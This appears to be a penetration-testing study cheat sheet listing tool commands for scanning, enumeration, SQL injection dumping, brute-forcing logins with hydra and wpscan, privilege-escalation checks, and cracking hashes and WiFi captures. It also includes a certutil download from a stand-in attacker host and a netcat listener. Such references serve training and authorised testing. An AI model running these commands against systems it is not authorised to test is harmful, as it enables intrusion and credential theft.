Golden Cheat Sheet
---


* **Local Web Server (Common):** `python3 -m http.server 8080`
* **Windows Retrieval (Certutil):** `Certutil.exe -Urlcache -f http://<ParrotIP>/eg.jpg C:\path\to\save\file\eg.jpg`
* **Linux Retrieval (Wget):** `wget http://<Windows_IP>:8080/eg.jpg -O eg.jpg`
* **Direct Listener:** `nc -lnvp 1234`

* **Visual Tree:** `tree` or `tree | grep .bmp`
* **Global Pattern Search:** `sudo find / -name *.txt`
* **Current Path Search:** `sudo find . -name SpecificFileName.txt`
* **Tool Localization:** `which toolname` or `find / -name toolname 2>/dev/null`
* **Wordlist Cleanup:** `sort filename.txt | uniq > newfile.txt` (Removes duplicates)

---


* **Full Service ID:** `nmap -A -oN scans`
* **Domain Controller (DC) Check:** Monitor **88/TCP (kerberos-sec)** and **389/TCP (LDAP)**.
* **Vulnerability Logic Testing:** `nmap -Pn --script vuln <TIP> -T5`
* **Directory Bruting:** `dirb <targetDomain> -x eg.txt`
* **Advanced Web Mapping:** `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt`
* **Exploit Research:** `searchsploit <service/version>` | `searchsploit -m <exploit>`

* **Interface Connection:** `adb connect <TIP>:5555`
* **Data Recovery:** `adb pull sdcard/`
* **Advanced Mobile Audit:** `python3 phonesploitpro.py` (Navigation: **N**=Next, **P**=Previous)
* **IoT Protocol Analysis:** `mqtt`

---


* **SQLmap Operations:** 
  * `--dbs` | `--tables` | `--dump`
  * `--cookie` (Session handling)
  * `-r request.txt` (Load from file)

* **WordPress Verification:** `wpscan -url <domain or ip>`
* **Credential Validation:** `wpscan -url <domain> -U user -P pass.txt -e u`

---


* **Format ID:** `file <filename>`
* **String Extraction:** `strings <filename>`
* **Embedded Data Recovery:** `binwalk -e <filename>`
* **Metadata Audit:** `exiftool <image_file>`
* **Disassembly:** `objdump -d <file>`
* **PE Header Audit:** `readpe --all <file.exe>`
* **Symbol Table Check:** `nm -u <file>`
* **Entropy Analysis:**
  * Windows: **DIE (Detect It Easy)**
  * Linux: `ent <file>` (Randomness check)

* **Bulk Verification:** `HashMyFiles.exe` (Windows) | `sha256sum <file>` (Linux)
* **Base64 Decoding:**
  * `echo "aGVsbG8=" | base64 -d`
  * `base64 -d Sniff.txt > secret.txt` | `cat secret.txt`
* **Steganography Tools:** `OpenStego`, `steghide` (`steghide extract -sf image.jpg`)
* **Certutil Hashing:** `certutil -hashfile filename.txt MD5`

* **Verification:** `steghide info file.jpg` (Verify with blank password first)
* **Standard Extraction:** `steghide extract -sf file.jpg`
* **High-Speed Recovery:** `stegseek file.jpg /usr/share/wordlists/rockyou.txt`
* **Whitespace Forensics:** `snow -C -p "pass" output.txt` (Extracts from text files)

---


* **SYN Analysis (No ACK):** `tcp.flags.syn == 1 && tcp.flags.ack == 0`
* **Target Specific:** `ip.dst == <ipaddress>`
* **Frame Content:** `frame contains "string"`
* **Expert Intel:** `Analyze` -> `Expert Info`
* **DDoS/Volume Check:** `Statistics` -> `Conversations` (Check high volume no-reply)
* **Plaintext Credentials:** `http.request.method == "POST"` or `tcp contains "password"`
* **Protocol Logins:** `ftp.request.command == "USER"`
* **Terminal Traffic:** `telnet`
* **DNS Audit:** `dns && udp.port == 53`
* **User-Agent Tracking:** `http.user_agent contains "sqlmap"` or `http.user_agent contains "nmap"`

---


* **Web Form Audit:** `hydra -l admin -P pass.txt <IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=invalid"`
* **FTP Validation:** `hydra -l user -P pass.txt ftp://10.10.10.10` or `hydra -l user -P pass.txt 10.10.10.10 ftp`
* **Telnet Validation (Port 23):** `hydra -L users.txt -P pass.txt <TIP> telnet -f`

* **Share Audit:** `smbmap -H <TIP>` | `smbclient -L //<IP>` | `/usr/bin/smbclient -L //10.10.10.10`
* **Protocol Enumeration:** `PATH=/usr/bin:$PATH enum4linux-ng -A <IP>`

* **Linux (Sudo):** `sudo -l` (Reference: **GTFOBins**)
* **Linux (SUID):** `find / -perm -u=s -type f 2>/dev/null`
* **Windows Audit:** `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
* **Windows Privs:** `whoami /priv` (Check for `SeImpersonatePrivilege`)
* **Kernel Suggesters:** `linux-exploit-suggester.sh` | `windows-exploit-suggester.py`

* **Brute Force Community String:** `onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt <TIP>`
* **Full SNMP Walk:** `snmpwalk -v 2c -c <String> <TIP>`
* **Structured Audit:** `snmp-check -t <TIP> -c <String>`
* **Nmap Script Audit:** `nmap -sU -p 161 --script snmp-enum <TIP>`

---

* **Container Detection:** `ls /.dockerenv` (Confirmed if file exists)
* **Docker Context:** `docker ps` (Active containers) | `docker images` (Local images)
* **Orchestration Audit:** `kubectl get pods` | `kubectl describe pod <pod_name>`
* **Object Storage Audit:** `aws s3 ls s3://<bucket_name> --no-sign-request`

---

* **RSA Key Preparation:** `python3 /usr/share/john/ssh2john.py id_rsa`
* **Hash Validation (John):** `john hash.txt` | `john --show hash.txt`
* **GPU/High Performance:** `hashcat -m <mode> hash.txt wordlist.txt`
* **WiFi Recovery (.cap):** `aircrack-ng -w wordlist.txt capture.cap`
* **BSSID Targeted:** `aircrack-ng -b <bssid> -w wifiPassList.txt handShakeCapture.cap`
* **Double Encryption:** Decrypt primary layer (password), then use hash crackers/online tools.

---

* **Identification:** `nmap -p 23 --open <Subnet>`
* **Traffic Sniffing:** Filter `telnet` -> Right-click -> `Follow TCP Stream`
* **Banner Capture:** `nc -v <TIP> 23`
* **Login Access:** `telnet <TIP>`

---

| Protocol | Recommended Audit Tool |
| :--- | :--- |
| **FTP** | `ftp` / `hydra` |
| **SMB** | `smbclient` / `enum4linux-ng` |
| **HTTP/Web** | `dirb` / `sqlmap` / `gobuster` |
| **.cap** | `aircrack-ng` |
| **.pcap** | `Wireshark` |
| **Hashes** | `john` / `hashcat` |
| **Media/Image** | `steghide` / `stegseek` / `exiftool` |
